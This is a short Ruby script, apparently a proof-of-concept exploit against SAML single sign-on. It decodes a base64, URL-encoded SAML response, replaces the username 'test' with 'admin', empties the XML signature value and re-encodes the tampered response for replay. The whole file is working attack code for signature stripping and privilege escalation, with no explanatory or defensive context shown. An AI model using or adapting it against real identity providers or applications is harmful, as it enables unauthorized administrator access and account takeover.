require 'uri'
require 'base64'

str = URI.unescape ARGV[0] 
response = Base64.decode64(str)

malicious_response = response.gsub("test","admin")
without_signature = malicious_response.gsub(/<ds:SignatureValue>.*<\/ds:SignatureValue>/,"<ds:SignatureValue></ds:SignatureValue>")
puts URI.escape(Base64.strict_encode64(without_signature),"+/=") 